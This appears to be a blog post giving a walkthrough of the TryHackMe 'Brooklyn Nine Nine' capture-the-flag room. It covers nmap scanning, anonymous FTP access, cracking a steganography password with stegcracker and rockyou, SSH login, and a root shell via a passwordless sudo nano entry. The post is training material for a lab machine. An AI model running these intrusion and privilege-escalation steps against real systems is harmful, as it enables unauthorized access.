---
layout: post
img: brooklyn.jpg
title: Brooklyn Nine Nine
date: 2023-02-20 20:30 +0800
categories: [THM writeup]
tags: [flags,hacking,tryhackme]
---


##  Brooklyn Nine Nine
  <https://tryhackme.com/room/brooklynninenine> 

### Objective:
  Capture the two flags.
 
### Difficulty:
  Easy
  
### #Enumeration
we will start with nmap by using the following command.  

```bash
nmap -A 10.10.32.149 -r
```

In the result of nmap we can see there are three ports open on machine ssh,ftp,and http.

```bash
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.23.18
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 167f2ffe0fba98777d6d3eb62572c6a3 (RSA)
|   256 2e3b61594bc429b5e858396f6fe99bee (ECDSA)
|_  256 ab162e79203c9b0a019c8c4426015804 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
{: .nolineno}

the ftp server allows anonymous login so i tried to login in ftp server and check the list of files. there is a file named _note_to_jake.txt_ 

I downloaded the file to my computer and checked its content. which shows its a note to jake to change his password.

> From Amy,

> Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine


try the http, tried the gobuster for directories but no luck with that. so on inspecting the _page elements_ found there is comment showing that there might be steganography on the image. for further inspection downloaded the image and tried binwalk and steghide but no better luck with those too.

```html
</p>This example creates a full page background image. Try to resize the browser window to see how it always will cover the full screen (when scrolled to top), and that it scales nicely on all screen sizes.</p>
<!-- Have you ever heard of steganography? -->
```

at last tried stegcracker for cracking password of image and it worked.

```
stegcracker brooklyn99.jpg wordlists/rockyou.txt
```

```bash
Counting lines in wordlist..
Attacking file '/Users/sentinel/Downloads/brooklyn99.jpg' with wordlist '../wordlists/rockyou.txt'..
Successfully cracked file with password: admin
Tried 20330 passwords
Your file has been written to: /Users/sentinel/Downloads/brooklyn99.jpg.out
admin
```
{: .nolineno}

so found the password for holt, now login to ssh using the hold's password and check for the files there is a user flag that is first flag.

```bash
ssh holt@10.10.32.149
holt@10.10.32.149's password: 
Last login: Tue May 26 08:59:00 2020 from 10.10.10.18
holt@brookly_nine_nine:~$ ls
nano.save  user.txt
```
{: .nolineno}

>cat user.txt

and you will get your first flag.

To escalate priviledge first check for sudo permission and found the holt have the permission to use /bin/nano as sudo without any password .

> sudo -l

```
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
 ```

use the _/bin/nano_ file to access root flag. 

```bash
sudo /bin/nano /root/root.text
```
{: .nolineno}

> you can use "sudo /bin/nano -s /bin/sh" then write "/bin/sh" in nano and press "ctrl+t" or "^T" for full root shell to check flag as mentioned in GTFOBins.
{: .prompt-tip}


